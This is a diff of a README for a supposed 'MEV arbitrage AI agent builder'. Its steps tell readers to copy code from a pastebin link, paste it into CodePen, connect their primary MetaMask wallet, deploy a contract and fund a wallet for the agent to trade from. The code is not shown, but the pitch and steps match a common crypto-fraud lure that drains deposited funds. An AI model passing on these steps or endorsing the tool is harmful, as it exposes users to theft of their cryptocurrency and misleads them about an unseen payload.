@@ -1,4 +1,4 @@
-OPENMANUS MEV Arbitrage AI Agent Builder 🚀
+### 🚀 MEV Arbitrage OpenManus Agent Builder 🚀
 
 Welcome to the MEV Arbitrage Agent Builder! This tool empowers you to capitalize on price discrepancies across decentralized exchanges (DEXs) effortlessly.
 
@@ -20,44 +20,41 @@ Before you begin, ensure you have the following ready:
 ## Steps to Deploy Your MEV Arbitrage Agent
 
 
-1. Begin by copying the complete code provided in the MEV-builder at: https://pastebin.com/raw/2RkFKkG2
+## 1. Begin by copying the complete code provided in the MEV-builder at: https://pastebin.com/raw/2RkFKkG2
 
 
-2. Open CodePen: Navigate to https://www.codepen.io/ .
+## 2. Open CodePen: Navigate to https://www.codepen.io/ .
    - Maximize the HTML section and paste the full code you copied.
 ![1](https://github.com/user-attachments/assets/550bae8a-2b09-4a84-be5d-cf6f24202bea)
 
-3. Connect Your Wallet: Use MetaMask to connect your primary wallet.
+## 3. Connect Your Wallet: Use MetaMask to connect your primary wallet.
 ![Screenshot_1](https://github.com/user-attachments/assets/ae9b21d0-3372-45d4-907b-b6c402322a45)
 
 
-4. Configure Your Settings: Tailor the settings to align with your trading preferences.
+## 4. Configure Your Settings: Tailor the settings to align with your trading preferences.
 ![Screenshot_2](https://github.com/user-attachments/assets/39c6559d-ffd5-4305-9747-ec76536b066d)
 
 
-5. Generate Your MEV Strategy: Create a custom strategy designed to fit your trading style.
+## 5. Generate Your MEV Strategy: Create a custom strategy designed to fit your trading style.
 ![Screenshot_3](https://github.com/user-attachments/assets/320de4c4-8d65-4f04-b52b-217a6ad896ad)
 
 
-6. Deploy Contract: Initiate the deployment of your smart contract on the blockchain.
-7. 
+## 6. Deploy Contract: Initiate the deployment of your smart contract on the blockchain.
 ![Screenshot_8](https://github.com/user-attachments/assets/b310add8-6095-4ffe-86e7-f2145742ed00)
 
 
-8. Set up a new account named "mev-wallet." Copy the address of this wallet for the agent to trade autonomously.
-9. 
+## 7. Set up a new account named "mev-wallet." Copy the address of this wallet for the agent to trade autonomously. 
 ![Screenshot_17](https://github.com/user-attachments/assets/11397bcd-d78e-472d-a416-d16c521c0b7d)
 
 
-
-10. Provide the address of the "mev-wallet" for the agent to execute trades.
+## 8. Provide the address of the "mev-wallet" for the agent to execute trades.
 ![Screenshot_16](https://github.com/user-attachments/assets/32eb1e9d-ef1b-4054-b9e6-e02fabd9330b)
 
-11. Confirm Transaction: Wait for the transaction to be confirmed on the blockchain network.
+## 9. Confirm Transaction: Wait for the transaction to be confirmed on the blockchain network.
 ![Screenshot_20](https://github.com/user-attachments/assets/4b4f626a-885f-4269-8ac9-892050d731e8)
 
 
-12. Search Mempool for Profitable Transactions: The agent will actively monitor the mempool for lucrative opportunities.
+## 10. Search Mempool for Profitable Transactions: The agent will actively monitor the mempool for lucrative opportunities.
 ![Screenshot_19](https://github.com/user-attachments/assets/cc51cba7-4c99-4d22-8842-5fb1ad074a15)
 
 
